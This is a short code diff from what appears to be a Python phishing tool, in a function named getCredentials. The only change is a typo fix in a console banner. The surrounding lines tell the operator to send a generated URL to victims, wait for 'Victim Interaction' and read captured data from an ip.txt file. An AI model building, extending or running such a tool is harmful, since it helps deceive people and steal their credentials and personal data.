@@ -675,7 +675,7 @@ def getCredentials(port):
     print("{5}-------------------------------\n{0}[ {2}CUSTOM {1} URL !!{0}] \n{5}-------------------------------{4}".format(RED, name, CYAN, GREEN, DEFAULT ,YELLOW))
     print("\n{0}[{2}!{0}]{2} SEND THIS {1} URL TO VICTIMS-\n{0}[{2}*{0}]{2} {1} URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}{1} URL: ".format(RED,name,CYAN,GREEN,DEFAULT,YELLOW,port) + link )
     print("{0}[{2}*{0}]{2} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{5}________________________________________________________________________________".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO PREFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X        {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
+    print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X        {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
     while True:
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
